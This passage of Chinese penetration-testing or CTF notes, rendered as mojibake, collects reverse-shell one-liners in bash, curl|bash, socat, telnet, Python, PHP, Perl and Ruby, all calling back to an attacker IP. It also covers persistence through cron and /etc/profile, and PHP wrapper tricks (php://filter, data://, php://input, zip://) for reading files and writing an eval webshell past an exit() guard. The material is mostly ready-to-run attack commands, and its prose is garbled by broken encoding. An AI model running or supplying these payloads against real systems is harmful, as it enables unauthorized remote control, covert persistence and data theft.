**ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœºï¼š**

```
bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1
```

ä»¥ä¸‹æ˜¯é’ˆå¯¹Bashåå¼¹ä¸€å¥è¯è¿›è¡Œäº†æ‹†åˆ†è¯´æ˜ï¼š

| å‘½ä»¤                        | å‘½ä»¤è¯¦è§£                                                     |
| --------------------------- | ------------------------------------------------------------ |
| bash -i                     | äº§ç”Ÿä¸€ä¸ªbashäº¤äº’ç¯å¢ƒã€‚                                       |
| >&                          | å°†è”åˆç¬¦å·å‰é¢çš„å†…å®¹ä¸åé¢ç›¸ç»“åˆï¼Œç„¶åä¸€èµ·é‡å®šå‘ç»™åè€…ã€‚     |
| /dev/tcp/47.xxx.xxx.72/2333 | Linuxç¯å¢ƒä¸­æ‰€æœ‰çš„å†…å®¹éƒ½æ˜¯ä»¥æ–‡ä»¶çš„å½¢å¼å­˜åœ¨çš„ï¼Œå…¶å®å¤§å®¶ä¸€çœ‹è§è¿™ä¸ªå†…å®¹å°±èƒ½æ˜ç™½ï¼Œå°±æ˜¯è®©ç›®æ ‡ä¸»æœºä¸æ”»å‡»æœº47.xxx.xxx.72çš„2333ç«¯å£å»ºç«‹ä¸€ä¸ªtcpè¿æ¥ã€‚ |
| 0>&1                        | å°†æ ‡å‡†è¾“å…¥ä¸æ ‡å‡†è¾“å‡ºçš„å†…å®¹ç›¸ç»“åˆï¼Œç„¶åé‡å®šå‘ç»™å‰é¢æ ‡å‡†è¾“å‡ºçš„å†…å®¹ã€‚ |

### 3.Curlé…åˆBashåå¼¹shell

è¿™é‡Œæ“ä½œä¹Ÿå¾ˆç®€å•ï¼Œå€ŸåŠ©äº†Linuxä¸­çš„ç®¡é“ã€‚

é¦–å…ˆï¼Œåœ¨æ”»å‡»è€…vpsçš„webç›®å½•é‡Œé¢åˆ›å»ºä¸€ä¸ªindexæ–‡ä»¶ï¼ˆindex.phpæˆ–index.htmlï¼‰ï¼Œå†…å®¹å¦‚ä¸‹ï¼š

```
bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1
```

å¹¶å¼€å¯2333ç«¯å£çš„ç›‘å¬ã€‚

ç„¶åå†ç›®æ ‡æœºä¸Šæ‰§è¡Œå¦‚ä¸‹ï¼Œå³å¯åå¼¹shellï¼š

```
curl 47.xxx.xxx.72|bash
```

Curlé…åˆBashåå¼¹shellçš„æ–¹å¼åœ¨CTFé¢˜ç›®ä¸­ç»å¸¸å‡ºç°ï¼Œ`curl IP|bash` ä¸­çš„IPå¯ä»¥æ˜¯ä»»æ„æ ¼å¼çš„ï¼Œå¯ä»¥æ˜¯åè¿›åˆ¶ã€åå…­è¿›åˆ¶ã€å…«è¿›åˆ¶ã€äºŒè¿›åˆ¶ç­‰ç­‰ã€‚

### 4.å°†åå¼¹shellçš„å‘½ä»¤å†™å…¥å®šæ—¶ä»»åŠ¡

æˆ‘ä»¬å¯ä»¥åœ¨ç›®æ ‡ä¸»æœºçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶ä¸­å†™å…¥ä¸€ä¸ªåå¼¹shellçš„è„šæœ¬ï¼Œä½†æ˜¯å‰ææ˜¯æˆ‘ä»¬å¿…é¡»è¦çŸ¥é“ç›®æ ‡ä¸»æœºå½“å‰çš„ç”¨æˆ·åæ˜¯å“ªä¸ªã€‚å› ä¸ºæˆ‘ä»¬çš„åå¼¹shellå‘½ä»¤æ˜¯è¦å†™åœ¨ `/var/spool/cron/[crontabs]/<username>` å†…çš„ï¼Œæ‰€ä»¥å¿…é¡»è¦çŸ¥é“è¿œç¨‹ä¸»æœºå½“å‰çš„ç”¨æˆ·åã€‚å¦åˆ™å°±ä¸èƒ½ç”Ÿæ•ˆã€‚

æ¯”å¦‚ï¼Œå½“å‰ç”¨æˆ·åä¸ºrootï¼Œæˆ‘ä»¬å°±è¦å°†ä¸‹é¢å†…å®¹å†™å…¥åˆ° /var/spool/cron/root ä¸­ã€‚(centosç³»åˆ—ä¸»æœº)

æ¯”å¦‚ï¼Œå½“å‰ç”¨æˆ·åä¸ºrootï¼Œæˆ‘ä»¬å°±è¦å°†ä¸‹é¢å†…å®¹å†™å…¥åˆ° /var/spool/cron/crontabs/root ä¸­ã€‚(Debian/Ubuntuç³»åˆ—ä¸»æœº)

```
*/1  *  *  *  *   /bin/bash -i>&/dev/tcp/47.xxx.xxx.72/2333 0>&1

#æ¯éš”ä¸€åˆ†é’Ÿï¼Œå‘47.xxx.xxx.72çš„2333å·ç«¯å£å‘é€shell
```

### 5.å°†åå¼¹shellçš„å‘½ä»¤å†™å…¥/etc/profileæ–‡ä»¶

å°†ä»¥ä¸‹åå¼¹shellçš„å‘½å†™å…¥/etc/profileæ–‡ä»¶ä¸­ï¼Œ/etc/profileä¸­çš„å†…å®¹ä¼šåœ¨ç”¨æˆ·æ‰“å¼€bashçª—å£æ—¶æ‰§è¡Œã€‚

```
/bin/bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1 &
# æœ€åé¢é‚£ä¸ª&ä¸ºçš„æ˜¯é˜²æ­¢ç®¡ç†å‘˜æ— æ³•è¾“å…¥å‘½ä»¤
```

å½“ç›®æ ‡ä¸»æœºç®¡ç†å‘˜è¿œç¨‹è¿æ¥è¯¥ä¸»æœºæ—¶ï¼Œå°±ä¼šæ‰§è¡Œè¯¥å‘½ä»¤ï¼ŒæˆåŠŸè·å¾—ç›®æ ‡æœºçš„shell

### 6.åˆ©ç”¨Socatåå¼¹shell

Socatæ˜¯Linux ä¸‹ä¸€ä¸ªå¤šåŠŸèƒ½çš„ç½‘ç»œå·¥å…·ï¼Œåå­—æ¥ç”±æ˜¯â€Socket CATâ€ï¼Œå› æ­¤å¯ä»¥çœ‹å‡ºå®ƒæ˜¯åŸºäºsocketçš„ï¼Œå…¶åŠŸèƒ½ä¸netcatç±»ä¼¼ï¼Œä¸è¿‡æ®è¯´å¯ä»¥çœ‹åšnetcatçš„åŠ å¼ºç‰ˆï¼Œäº‹å®ä¸Šçš„ç¡®ä¹Ÿæ˜¯å¦‚æ­¤ã€‚æˆ‘è¿™é‡Œåªç®€å•çš„ä»‹ç»ä¸‹æ€ä¹ˆä½¿ç”¨å®ƒå¼€å¯ç›‘å¬å’Œåå¼¹shellï¼Œå…¶ä»–è¯¦ç»†å†…å®¹å¯ä»¥å‚è§è¿™é‡Œï¼šhttp://brieflyx.me/2015/linux-tools/socat-introduction/

å®‰è£…Socatçš„æ–¹æ³•å¾ˆç®€å•ï¼š

- Ubuntuç­‰å¯ä»¥ç›´æ¥ä½¿ç”¨ `apt-get install socat` å‘½ä»¤è¿›è¡Œå®‰è£…
- ä¹Ÿå¯ä»¥å»å®˜ç½‘ä¸‹è½½æºç åŒ…ï¼šhttp://www.dest-unreach.org/socat

**æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬ï¼š**

```
socat TCP-LISTEN:2333 -
æˆ–
nc -lvvp 2333
```

**ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœºï¼š**

```
socat tcp-connect:47.xxx.xxx.72:2333 exec:'bash -li',pty,stderr,setsid,sigint,sane
```

### 7.åˆ©ç”¨Telnetåå¼¹shell

å½“ncå’Œ/dev/tcpä¸å¯ç”¨ï¼Œä¸”ç›®æ ‡ä¸»æœºå’Œæ”»å‡»æœºä¸Šæ”¯æŒTelnetæœåŠ¡æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Telnetåå¼¹shellã€‚

### æ–¹æ³•ä¸€

**æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬ï¼š**

```
nc -lvvp 2333
```

**ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœºï¼š**

```
mknod a p; telnet 47.xxx.xxx.72 2333 0<a | /bin/bash 1>a
```

### æ–¹æ³•äºŒ

**æ”»å‡»æœºéœ€è¦å¼€å¯ä¸¤ä¸ªæœ¬åœ°ç›‘å¬ï¼š**

```
nc -lvvp 2333
nc -lvvp 4000
```

**ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœºï¼š**

```
telnet 47.101.57.72 2333 | /bin/bash | telnet 47.101.57.72 4000
```

åœ¨æ”»å‡»æœº2333ç«¯å£çš„ç»ˆç«¯ä¸Šè¾“å…¥çš„å‘½ä»¤ä¼šåœ¨ç›®æ ‡æœºä¸Šæ‰§è¡Œï¼Œæ‰§è¡Œçš„å›æ˜¾å°†é€šè¿‡4000ç«¯å£çš„ç»ˆç«¯æ˜¾ç¤ºå‡ºæ¥ã€‚

### å„ç§è„šæœ¬åå¼¹shell

#### Python è„šæœ¬åå¼¹shell

å½“ç›®æ ‡ä¸»æœºä¸Šæœ‰pythonç¯å¢ƒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨Pythonæ¥åå¼¹shellã€‚Pythonåœ¨ç°åœ¨ä¸€èˆ¬å‘è¡Œç‰ˆLinuxç³»ç»Ÿä¸­éƒ½ä¼šè‡ªå¸¦ï¼Œæ‰€ä»¥ä½¿ç”¨èµ·æ¥ä¹Ÿè¾ƒä¸ºæ–¹ä¾¿ï¼Œå³ä½¿æ²¡æœ‰å®‰è£…ï¼Œæˆ‘ä»¬æ‰‹åŠ¨å®‰è£…ä¹Ÿå¾ˆæ–¹ä¾¿ã€‚

**æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬ï¼š**

```
nc -lvvp 2333
```

**ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœºï¼š**

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.xxx.xxx.72",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### php è„šæœ¬åå¼¹shell

å½“ç›®æ ‡ä¸»æœºä¸Šæœ‰phpç¯å¢ƒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨phpæ¥åå¼¹shellã€‚

**æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬ï¼š**

```
nc -lvvp 2333
```

**ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœºï¼š**

```
php -r '$sock=fsockopen("47.xxx.xxx.72",2333);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Perl è„šæœ¬åå¼¹shell

å½“ç›®æ ‡ä¸»æœºä¸Šæœ‰perlç¯å¢ƒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨perlæ¥åå¼¹shellã€‚

**æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬ï¼š**

```
nc -lvvp 2333
```

**ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœºï¼š**

```
perl -e 'use Socket;$i="47.101.57.72";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Rubyè„šæœ¬åå¼¹shell

å½“ç›®æ ‡ä¸»æœºä¸Šæœ‰rubyç¯å¢ƒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨rubyæ¥åå¼¹shellã€‚

**æ”»å‡»æœºå¼€å¯æœ¬åœ°ç›‘å¬ï¼š**

```
nc -lvvp 2333
```

**ç›®æ ‡æœºä¸»åŠ¨è¿æ¥æ”»å‡»æœºï¼š**

```
ruby -rsocket -e 'c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
æˆ–
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```



## 5.PHPä¼ªåè®®

â€‹	PHPä¼ªåè®®è¯¦è§£è¿‡æ»¤å™¨



phpæ”¯æŒçš„ä¼ªåè®®

```php
1 file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ
2 http:// â€” è®¿é—® HTTP(s) ç½‘å€
3 ftp:// â€” è®¿é—® FTP(s) URLs
4 php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰
5 zlib:// â€” å‹ç¼©æµ
6 data:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰
7 glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼
8 phar:// â€” PHP å½’æ¡£
9 ssh2:// â€” Secure Shell 2
10 rar:// â€” RAR
11 ogg:// â€” éŸ³é¢‘æµ
12 expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ
123456789101112
```

### 1 php://filter

php://filter æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œ è®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚ è¿™å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ readfile()ã€ file() å’Œ file_get_contents()ï¼Œ åœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚

ç®€å•é€šä¿—çš„è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸­é—´ä»¶ï¼Œåœ¨è¯»å…¥æˆ–å†™å…¥æ•°æ®çš„æ—¶å€™å¯¹æ•°æ®è¿›è¡Œå¤„ç†åè¾“å‡ºçš„ä¸€ä¸ªè¿‡ç¨‹ã€‚

**php://filter**å¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ ä»»æ„æ–‡ä»¶è¯»å–ã€‚

åè®®å‚æ•°

| åç§°                        | æè¿°                                                         |
| --------------------------- | ------------------------------------------------------------ |
| `resource=<è¦è¿‡æ»¤çš„æ•°æ®æµ>` | è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚             |
| `read=<è¯»é“¾çš„ç­›é€‰åˆ—è¡¨>`     | è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ`|`ï¼‰åˆ†éš”ã€‚ |
| `write=<å†™é“¾çš„ç­›é€‰åˆ—è¡¨>`    | è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ`|`ï¼‰åˆ†éš”ã€‚ |
| `<ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨>`      | ä»»ä½•æ²¡æœ‰ä»¥ `read=` æˆ– `write=` ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚ |

å¸¸ç”¨ï¼š

```php
php://filter/read=convert.base64-encode/resource=index.php
php://filter/resource=index.php
12
```

åˆ©ç”¨filteråè®®è¯»æ–‡ä»¶Â±ï¼Œå°†index.phpé€šè¿‡base64ç¼–ç åè¿›è¡Œè¾“å‡ºã€‚è¿™æ ·åšçš„å¥½å¤„å°±æ˜¯å¦‚æœä¸è¿›è¡Œç¼–ç ï¼Œæ–‡ä»¶åŒ…å«åå°±ä¸ä¼šæœ‰è¾“å‡ºç»“æœï¼Œè€Œæ˜¯å½“åšphpæ–‡ä»¶æ‰§è¡Œäº†ï¼Œè€Œé€šè¿‡ç¼–ç ååˆ™å¯ä»¥è¯»å–æ–‡ä»¶æºç ã€‚

è€Œä½¿ç”¨çš„convert.base64-encodeï¼Œå°±æ˜¯ä¸€ç§è¿‡æ»¤å™¨ã€‚

### è¿‡æ»¤å™¨

[å„ç§ç»•è¿‡](https://blog.csdn.net/qq_44657899/article/details/109300335)

#### å­—ç¬¦ä¸²è¿‡æ»¤å™¨

è¯¥ç±»é€šå¸¸ä»¥`string`å¼€å¤´ï¼Œå¯¹æ¯ä¸ªå­—ç¬¦éƒ½è¿›è¡ŒåŒæ ·æ–¹å¼çš„å¤„ç†ã€‚

**string.rot13**

ä¸€ç§å­—ç¬¦å¤„ç†æ–¹å¼ï¼Œå­—ç¬¦å³ç§»åä¸‰ä½ã€‚

**string.toupper**

å°†æ‰€æœ‰å­—ç¬¦è½¬æ¢ä¸ºå¤§å†™ã€‚

**string.tolower**

å°†æ‰€æœ‰å­—ç¬¦è½¬æ¢ä¸ºå°å†™ã€‚

#### string.strip_tags

è¿™ä¸ªè¿‡æ»¤å™¨å°±æ¯”è¾ƒæœ‰æ„æ€ï¼Œç”¨æ¥å¤„ç†æ‰è¯»å…¥çš„æ‰€æœ‰æ ‡ç­¾ï¼Œä¾‹å¦‚XMLçš„ç­‰ç­‰ã€‚åœ¨ç»•è¿‡æ­»äº¡exitå¤§æœ‰ç”¨å¤„ã€‚

#### è½¬æ¢è¿‡æ»¤å™¨

å¯¹æ•°æ®æµè¿›è¡Œç¼–ç ï¼Œé€šå¸¸ç”¨æ¥è¯»å–æ–‡ä»¶æºç ã€‚

**convert.base64-encode & convert.base64-decode**

base64åŠ å¯†è§£å¯†

**convert.quoted-printable-encode & convert.quoted-printable-decode**

å¯ä»¥ç¿»è¯‘ä¸ºå¯æ‰“å°å­—ç¬¦å¼•ç”¨ç¼–ç ï¼Œä½¿ç”¨å¯ä»¥æ‰“å°çš„ASCIIç¼–ç çš„å­—ç¬¦è¡¨ç¤ºå„ç§ç¼–ç å½¢å¼ä¸‹çš„å­—ç¬¦ã€‚

#### å‹ç¼©è¿‡æ»¤å™¨

æ³¨æ„ï¼Œè¿™é‡Œçš„å‹ç¼©è¿‡æ»¤å™¨æŒ‡çš„å¹¶ä¸æ˜¯åœ¨æ•°æ®æµä¼ å…¥çš„æ—¶å€™å¯¹æ•´ä¸ªæ•°æ®è¿›è¡Œå†™å…¥æ–‡ä»¶åå‹ç¼©æ–‡ä»¶ï¼Œä¹Ÿä¸ä»£è¡¨å¯ä»¥å‹ç¼©æˆ–è€…è§£å‹æ•°æ®æµã€‚å‹ç¼©è¿‡æ»¤å™¨**ä¸**äº§ç”Ÿå‘½ä»¤è¡Œå·¥å…·å¦‚ `gzip`çš„å¤´å’Œå°¾ä¿¡æ¯ã€‚åªæ˜¯å‹ç¼©å’Œè§£å‹æ•°æ®æµä¸­çš„æœ‰æ•ˆè½½è·éƒ¨åˆ†ã€‚

ç”¨åˆ°çš„ä¸¤ä¸ªç›¸å…³è¿‡æ»¤å™¨ï¼š`zlib.deflate`ï¼ˆå‹ç¼©ï¼‰å’Œ `zlib.inflate`ï¼ˆè§£å‹ï¼‰ã€‚zilbæ˜¯æ¯”è¾ƒä¸»æµçš„ç”¨æ³•ï¼Œè‡³äº`bzip2.compress`å’Œ `bzip2.decompress`å·¥ä½œçš„æ–¹å¼ä¸ [zlib](https://so.csdn.net/so/search?q=zlib&spm=1001.2101.3001.7020) è¿‡æ»¤å™¨å¤§è‡´ç›¸åŒã€‚

#### åŠ å¯†è¿‡æ»¤å™¨

`mcrypt.*`å’Œ `mdecrypt.*`ä½¿ç”¨ libmcrypt æä¾›äº†å¯¹ç§°çš„åŠ å¯†å’Œè§£å¯†ã€‚

æ›´å¤šå¦™ç”¨ï¼šhttps://www.leavesongs.com/PENETRATION/php-filter-magic.html

### åˆ©ç”¨filterä¼ªåè®®ç»•è¿‡æ­»äº¡exit

#### ä»€ä¹ˆæ˜¯æ­»äº¡exit

æ­»äº¡exitæŒ‡çš„æ˜¯åœ¨è¿›è¡Œå†™å…¥PHPæ–‡ä»¶æ“ä½œæ—¶ï¼Œæ‰§è¡Œäº†ä»¥ä¸‹å‡½æ•°ï¼š

```php
file_put_contents($content, '<?php exit();' . $content);
1
```

äº¦æˆ–è€…

```php
file_put_contents($content, '<?php exit();?>' . $content);
1
```

è¿™æ ·ï¼Œå½“ä½ æ’å…¥ä¸€å¥è¯æœ¨é©¬æ—¶ï¼Œæ–‡ä»¶çš„å†…å®¹æ˜¯è¿™æ ·å­çš„ï¼š

```php
<?php exit();?>

<?php @eval($_POST['snakin']);?>
123
```

è¿™æ ·å³ä½¿æ’å…¥äº†ä¸€å¥è¯æœ¨é©¬ï¼Œåœ¨è¢«ä½¿ç”¨çš„æ—¶å€™ä¹Ÿæ— æ³•è¢«æ‰§è¡Œã€‚è¿™æ ·çš„æ­»äº¡exité€šå¸¸å­˜åœ¨äºç¼“å­˜ã€é…ç½®æ–‡ä»¶ç­‰ç­‰ä¸å…è®¸ç”¨æˆ·ç›´æ¥è®¿é—®çš„æ–‡ä»¶å½“ä¸­ã€‚

#### base64decodeç»•è¿‡

åˆ©ç”¨filteråè®®æ¥ç»•è¿‡ï¼Œçœ‹ä¸‹è¿™æ ·çš„ä»£ç ï¼š

```php
<?php

$content = '<?php exit; ?>';

$content .= $_POST['txt'];

file_put_contents($_POST['filename'], $content);
1234567
```

å½“ç”¨æˆ·é€šè¿‡POSTæ–¹å¼æäº¤ä¸€ä¸ªæ•°æ®æ—¶ï¼Œä¼šä¸æ­»äº¡exitè¿›è¡Œæ‹¼æ¥ï¼Œä»è€Œé¿å…æäº¤çš„æ•°æ®è¢«æ‰§è¡Œã€‚

ç„¶è€Œè¿™é‡Œå¯ä»¥åˆ©ç”¨php://filterçš„base64-decodeæ–¹æ³•ï¼Œå°†`$content`è§£ç ï¼Œåˆ©ç”¨php base64_decodeå‡½æ•°ç‰¹æ€§å»é™¤æ­»äº¡exitã€‚

base64ç¼–ç ä¸­åªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼Œå½“PHPé‡åˆ°ä¸å¯è§£ç çš„å­—ç¬¦æ—¶ï¼Œä¼šé€‰æ‹©æ€§çš„è·³è¿‡ï¼Œè¿™ä¸ªæ—¶å€™base64å°±ç›¸å½“äºä»¥ä¸‹çš„è¿‡ç¨‹ï¼š

```php
<?php

$_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);

base64_decode($_GET['txt']);
12345
```

æ‰€ä»¥ï¼Œå½“`$content` åŒ…å« `<?php exit; ?>`æ—¶ï¼Œè§£ç è¿‡ç¨‹ä¼šå…ˆå»é™¤è¯†åˆ«ä¸äº†çš„å­—ç¬¦ï¼Œ< ; ? >å’Œç©ºæ ¼ç­‰éƒ½å°†è¢«å»é™¤ï¼Œäºæ˜¯å‰©ä¸‹çš„å­—ç¬¦å°±åªæœ‰`phpexit`ä»¥åŠæˆ‘ä»¬ä¼ å…¥çš„å­—ç¬¦äº†ã€‚ç”±äºbase64æ˜¯4ä¸ªbyteä¸€ç»„ï¼Œå†æ·»åŠ ä¸€ä¸ªå­—ç¬¦ä¾‹å¦‚æ·»åŠ å­—ç¬¦â€™aâ€™åï¼Œå°†â€™phpexitaâ€™å½“åšä¸¤ç»„base64è¿›è¡Œè§£ç ï¼Œä¹Ÿå°±ç»•è¿‡è¿™ä¸ªæ­»äº¡exitäº†ã€‚

è¿™ä¸ªæ—¶å€™åé¢å†åŠ ä¸Šç¼–ç åçš„ä¸€å¥è¯æœ¨é©¬ï¼Œå°±å¯ä»¥getshelläº†ã€‚

#### strip_tagsç»•è¿‡

è¿™ä¸ª`<?php exit; ?>`å®é™…ä¸Šæ˜¯ä¸€ä¸ªXMLæ ‡ç­¾ï¼Œæ—¢ç„¶æ˜¯XMLæ ‡ç­¾ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨strip_tagså‡½æ•°å»é™¤å®ƒï¼Œè€Œphp://filteråˆšå¥½æ˜¯æ”¯æŒè¿™ä¸ªæ–¹æ³•çš„ã€‚

ä½†æ˜¯æˆ‘ä»¬è¦å†™å…¥çš„ä¸€å¥è¯æœ¨é©¬ä¹Ÿæ˜¯XMLæ ‡ç­¾ï¼Œåœ¨ç”¨åˆ°strip_tagsæ—¶ä¹Ÿä¼šè¢«å»é™¤ã€‚

æ³¨æ„åˆ°åœ¨å†™å…¥æ–‡ä»¶çš„æ—¶å€™ï¼Œfilteræ˜¯æ”¯æŒå¤šä¸ªè¿‡æ»¤å™¨çš„ã€‚å¯ä»¥å…ˆå°†webshellç»è¿‡base64ç¼–ç ï¼Œstrip_tagså»é™¤æ­»äº¡exitä¹‹åï¼Œå†é€šè¿‡base64-decodeå¤åŸã€‚

```php
php://filter/string.strip_tags|convert.base64-decode/resource=shell.php
1
```

æ›´å¤šç»•è¿‡æ–¹æ³•ï¼š[file_put_contentå’Œæ­»äº¡Â·æ‚ç³…ä»£ç ä¹‹ç¼˜](https://xz.aliyun.com/t/8163#toc-2)

### 2 data://

æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚å¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„data://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚

ç¤ºä¾‹ç”¨æ³•ï¼š

```php
1ã€data://text/plain,
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
 
2ã€data://text/plain;base64,
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
12345
```

### èŒƒä¾‹

Example #1 æ‰“å° data:// çš„å†…å®¹

```php
<?php
// æ‰“å° "I love PHP"
echo  file_get_contents ( 'data://text/plain;base64,SSBsb3ZlIFBIUAo=' );
?>
1234
```

Example #2 è·å–åª’ä½“ç±»å‹

```php
<?php
$fp    =  fopen ( 'data://text/plain;base64,' ,  'r' );
$meta  =  stream_get_meta_data ( $fp );

// æ‰“å° "text/plain"
echo  $meta [ 'mediatype' ];
?>
1234567
```

### 3 file://

ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä¸”ä¸å—allow_url_fopenï¼Œallow_url_includeå½±å“
file://åè®®ä¸»è¦ç”¨äºè®¿é—®æ–‡ä»¶(ç»å¯¹è·¯å¾„ã€ç›¸å¯¹è·¯å¾„ä»¥åŠç½‘ç»œè·¯å¾„)
æ¯”å¦‚ï¼šhttp://www.xx.com?file=file:///etc/passsword

### 4 php://

åœ¨allow_url_fopenï¼Œallow_url_includeéƒ½å…³é—­çš„æƒ…å†µä¸‹å¯ä»¥æ­£å¸¸ä½¿ç”¨
php://ä½œç”¨ä¸ºè®¿é—®è¾“å…¥è¾“å‡ºæµ

### 5 php://input

**php://input**å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå°†postè¯·æ±‚çš„æ•°æ®å½“ä½œphpä»£ç æ‰§è¡Œã€‚å½“ä¼ å…¥çš„å‚æ•°ä½œä¸ºæ–‡ä»¶åæ‰“å¼€æ—¶ï¼Œå¯ä»¥å°†å‚æ•°è®¾ä¸ºphp://input,åŒæ—¶postæƒ³è®¾ç½®çš„æ–‡ä»¶å†…å®¹ï¼Œphpæ‰§è¡Œæ—¶ä¼šå°†postå†…å®¹å½“ä½œæ–‡ä»¶å†…å®¹ã€‚ä»è€Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚

ä¾‹å¦‚ï¼š
http://127.0.0.1/cmd.php?cmd=php://input
POSTæ•°æ®ï¼š<?php phpinfo()?>
æ³¨æ„ï¼š
å½“enctype="multipart/form-data"çš„æ—¶å€™ php://input` æ˜¯æ— æ•ˆçš„

é‡åˆ°file_get_contents()è¦æƒ³åˆ°ç”¨php://inputç»•è¿‡ã€‚

### 6 zip://

zip:// å¯ä»¥è®¿é—®å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip://æµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚ä»è€Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚

```
zip://ä¸­åªèƒ½ä¼ å…¥ç»å¯¹è·¯å¾„ã€‚
è¦ç”¨#åˆ†éš”å‹ç¼©åŒ…å’Œå‹ç¼©åŒ…é‡Œçš„å†…å®¹ï¼Œå¹¶ä¸”#è¦ç”¨urlç¼–ç %23ï¼ˆå³ä¸‹è¿°POCä¸­#è¦ç”¨%23æ›¿æ¢ï¼‰
åªéœ€è¦æ˜¯zipçš„å‹ç¼©åŒ…å³å¯ï¼Œåç¼€åå¯ä»¥ä»»æ„æ›´æ”¹ã€‚
ç›¸åŒçš„ç±»å‹çš„è¿˜æœ‰zlib://å’Œbzip2://
1234
```

